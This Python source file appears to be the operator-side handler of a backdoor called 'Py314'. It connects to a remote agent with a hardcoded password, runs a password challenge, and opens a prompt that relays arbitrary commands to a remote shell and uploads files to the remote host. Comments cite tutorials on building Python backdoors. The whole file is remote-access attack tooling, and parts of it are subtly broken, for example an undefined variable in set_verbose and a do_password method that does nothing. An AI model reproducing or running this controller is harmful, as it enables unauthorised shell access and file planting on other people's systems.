import sys
import glob
import time
import socket
import modules
import logging
import hashlib
import threading
from cmd import Cmd
from os import system, path
from netaddr import ip
from termcolor import colored
from prettytable import PrettyTable


class Agent(Cmd):
# Agent prompt class, to define commands and interact with modules
    """Agent prompt to use modules and interact with agent"""

    intro = 'Type help or ? to list commands. (default input will be send to a remote shell)'

# < -------------------------- OVERRIDE -------------------------- >

    def default(self, cmd):
        """Override default method, to send unknow command to remote shell"""
        try: 

            modules.Shell(self.channel, self.password, cmd)

        except ConnectionResetError:
            logger.warning(f"Channel reset by peer")
            return True

        except BrokenPipeError:
            logger.warning(f"Channel reset by peer (broken pipe error)")
            return True

    def emptyline(self):
        """Called when an empty line is entered in response to the prompt.

        If this method is not overridden, it repeats the last nonempty
        command entered.

        """


    def do_help(self, arg):
        """Display help about commands"""

        names = self.get_names()
        commands = [names.replace('do_', '') for names in names if names.startswith('do_')]
        
        if arg:
            
            doc = getattr(self, 'do_' + arg).__doc__
            print(doc)
            
        elif not arg:
            table = PrettyTable()
            #table.vertical_char = ' '
            #table.border = False

            headers = ['command', 'description']
            table.field_names = headers

            for header in headers:
                table.align[header] = 'l'

                
            for option in dir(self):
                if option.startswith('do_'):
                    commandName = option.replace('do_', '')
                    commandDoc = getattr(self, option).__doc__

                    table.add_row([commandName, commandDoc])

            print(table)

        
# < -------------------------- CUSTOM -------------------------- >

    def define_channel(self, arg):
        """Define the open socket to interact with agent"""
        self.channel = arg

    def define_password(self, arg):
        """Define password used for encryption/decryption (messages and files)"""
        self.password = arg


# < -------------------------- COMMANDS -------------------------- >

    def do_check(self, arg):

        modules.Check(self.channel, self.password)

        
    def do_exit(self, arg):
        """Quit agent and close the channel"""
        self.channel.close()
        return True

    def do_upload(self, arg):
        """Upload a file to remote agent (destination must be a directory)"""

        # If arg, separate by space is different from 2 (needs source and destionation path)
        if len(arg.split(' ')) != 2:
            logger.warning('Please specify a source and a destination file (on remote host)')
            logger.debug(f"Arguments : {arg}")
        else:
            # Unpack arg, to add infile and outfile
            src, dst = arg.split(' ')
            
            # If source file is a directory
            if path.isdir(src):
                logger.warning("Source file can't be folder, please check source path")
            # Else if sourcce file doesn't exist
            elif not path.isfile(src):
                logger.warning("Source file doesn't exist, please check source path")
            else:
                logger.debug('Arguments are corrects, sended to Send module')
                modules.Send(self.channel, self.password, src, dst)

            


    def do_status(self, arg):
        """Display information about open channel with agent"""
        print(self.channel)





class Prompt(Cmd):
    """Simple Py314 Bind TCP handler"""


    optionsDict = {
        'rhost': '10.0.10.110',
        'rport': 1234,
        'password': 'Py314!',
        'proxy': '', 
        'verbose': False
    }

# < -------------------------- OVERRIDE -------------------------- >

    def emptyline(self):
        """Called when an empty line is entered in response to the prompt.

        If this method is not overridden, it repeats the last nonempty
        command entered.

        """

    def do_help(self, arg):
        """Display help about commands"""

        names = self.get_names()
        commands = [names.replace('do_', '') for names in names if names.startswith('do_')]
        
        if arg:
            
            doc = getattr(self, 'do_' + arg).__doc__
            print(doc)
            
        elif not arg:
            table = PrettyTable()
            #table.vertical_char = ' '
            #table.border = False

            headers = ['command', 'description']
            table.field_names = headers

            for header in headers:
                table.align[header] = 'l'

                
            for option in dir(self):
                if option.startswith('do_'):
                    commandName = option.replace('do_', '')
                    commandDoc = getattr(self, option).__doc__

                    table.add_row([commandName, commandDoc])

            print(table)


# < -------------------------- COMMANDS -------------------------- >

    def do_bg(self, arg):
        """Return to Py314 main interpreter"""
        return True

    def do_exit(self, arg):
        """Quit Py314"""
        exit()

    def do_password(self, arg):
        password = self.optionsDict['password']
        cipherPassword = hashlib.sha512(password.encode()).hexdigest()

    def do_run(self, arg):
        """Launch handler with defined settings"""
        bindAgent(self.optionsDict)

    def do_set(self, arg):
        """Set value for available option : set <option> <value>"""

        availableOptions = [options.replace('set_', '') for options in dir(self) if options.startswith('set_')]
        
        if len(arg.split(' ')) > 1:

            option = arg.split(' ')[0]
            value = arg.split(' ')[1]

            if option not in availableOptions:
                logger.info(f"Option {option} can't be set with this handler")
            else:
                self.optionsDict[option] = value
                logger.debug(f'Option [{option}] set to [{value}]')
        else:
            logger.warning(f'Please specify an <option> and a associated <value>')




    def do_options(self, arg):
        """Show currents settings of handler"""

        print("""\nThe bind_tcp handler is designed to bind a specified host with IP & port combination.""")
        print("""If the connection is successfull, a shell is automatically give, and remote actions are allowed\n""")

        table = PrettyTable()
        headers = ['name', 'value', 'description']
        table.field_names = headers
        for header in headers:
            table.align[header] = 'l'

        for option in dir(self):
            if option.startswith('set_'):
                optionName = option.replace('set_', '')
                optionValue = self.optionsDict[optionName]
                optionDoc = getattr(self, option).__doc__

                table.add_row([optionName, optionValue, optionDoc])

        print(table)

    def do_unset(self, arg):
        """Unset value for available option : unset <option>"""

        if len(arg.split(' ')) > 1 or len(arg.split(' ')) < 1:
            self.logger.warning(f"Please specify unset <option>")
        
        else:

            availableOptions = [options.replace('set_', '') for options in dir(self) if options.startswith('set_')]
            option = arg.split(' ')[0]
            #value = arg.split(' ')[1]

            if option not in availableOptions:
                logger.warning(f"Option {option} can't be unset")
            else:
                self.optionsDict[option] = ''




# < -------------------------- Handler OPTIONS -------------------------- >

    def set_rhost(self):
        """Define remote IP of Py314 agent to bind"""

    def set_rport(self):
        """Define remote port of Py314 agent to bind"""

    def set_password(self):
        """Define a password use to connect to Py314 agent and to perform symetric encryption of traffic"""

    def set_proxy(self):
        """Define a proxy, which be use to bind Py314 agent : <type>://<ip>:<port>"""

    def set_verbose(self):
        """Enable verbosity of bind_agent handler (default : False)"""
        self.optionsDict['verbose'] = arg




# ------------------------------------------------------------------
# ------------------------------ Main ------------------------------
# ------------------------------------------------------------------

BUFFER_SIZE = 4096
logger = logging.getLogger('main')


def startModule():

    
    subPrompt = Prompt()
    #subPrompt.define_logger(logger)
    subPrompt.prompt = f"({colored('bind_agent', 'yellow')}) > "
    subPrompt.cmdloop()



def bindAgent(dictionnary):

    host = dictionnary['rhost']
    port = int(dictionnary['rport'])
    password = dictionnary['password']
    proxy = dictionnary['proxy']
    verbose = dictionnary['verbose']

    ciperPassword = hashlib.sha512(password.encode()).hexdigest()
    
    try:
    
        #print(f"[+] Trying to connect to {host}:{port}")
        logger.info(f"Trying to connect to {host}:{port}")

        channel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        channel.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        channel.connect((host, port))
        challenge = passwordChallenge(channel, ciperPassword)


        if challenge is True:
            logger.info(f"Connection established to {host}:{port}")
            logger.debug(f'Successfull password challenge with : ')
            logger.debug(f'Password > {password}')
            logger.debug(f'SHA512 > {ciperPassword}')
        elif challenge is False:
            logger.info(f"[!] Password doesn't match")
            channel.close()
            return

        try:

            agentPrompt = Agent()
            agentPrompt.prompt = colored(f"agent@{host}:{port} > ", 'green') 
            agentPrompt.define_channel(channel)
            agentPrompt.define_password(password)
            agentPrompt.cmdloop()

        except KeyboardInterrupt:
            choice = input('\nDo you want to quit bind_agent channel [y/n] ? :')

            if choice.lower() == 'y':
                channel.close()
                return
            elif choice.lower() == 'n':
                pass
            else:
                pass

    except ConnectionError:
        logger.info(f"Can't established connection to {host}")
        return

    except ConnectionRefusedError as e:
        print(e)
        return

    except OSError as error:
        logger.warning(f"{error}")
        return



def passwordChallenge(channel, password):

    bufferSize = BUFFER_SIZE

    channel.sendall(password.encode())

    while True:
        challengeResponse = channel.recv(bufferSize)
        if len(challengeResponse) < bufferSize:
            break

    answer = challengeResponse.decode()
    if answer == hashlib.sha512(password.encode()).hexdigest():
        answer = True
    elif answer == ' ':
        answer = False


    return answer




def checkAgent(channel, objet):
    
    while True:


        try:
            channel.sendall(b'alive ?')

        except ConnectionResetError:
            logger.warning(f"Channel reset by peer")
            objet.do_exit()
            break

        except BrokenPipeError:
            logger.warning(f"\nChannel reset by peer (broken pipe error)")
            objet.exit_prompt
            break
        
        time.sleep(3)

    # https://www.shellvoide.com/python/how-to-hack-create-shell-backdoor-in-python/
    # https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-1/1038
    # https://dev.to/tman540/simple-remote-backdoor-with-python-33a0
